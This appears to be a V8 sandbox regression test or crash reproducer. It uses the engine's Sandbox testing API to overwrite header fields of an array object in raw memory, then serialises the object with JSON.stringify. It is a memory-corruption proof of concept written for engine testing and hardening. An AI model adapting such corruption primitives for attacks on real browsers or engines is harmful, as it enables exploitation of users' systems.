const v0 = [-65537,-19162,257,-536870912,5,-13677];
let buffer = new DataView(new Sandbox.MemoryView(0, 0x100000000));
let addr = Sandbox.getAddressOf(v0);
buffer.setUint16(addr + 14, 0x8, true);
buffer.setUint16(addr , 0x85f1, true);
JSON.stringify(v0);